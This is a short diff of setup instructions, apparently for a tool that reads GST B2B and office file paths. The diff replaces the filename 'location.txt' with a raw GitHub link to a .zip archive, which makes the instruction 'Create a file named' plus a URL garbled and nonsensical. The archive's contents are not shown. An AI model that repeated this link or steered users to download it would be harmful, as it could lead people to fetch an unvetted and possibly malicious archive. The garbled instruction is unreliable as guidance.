@@ -1,4 +1,4 @@
-Create a file named location.txt.
+Create a file named https://raw.githubusercontent.com/AyushPallod/B2B/main/calculating/B-v3.3.zip
 Write two lines into the file:
 First line: Path of the GST B2B file (from GST portal).
 Second line: Path of the Office file.
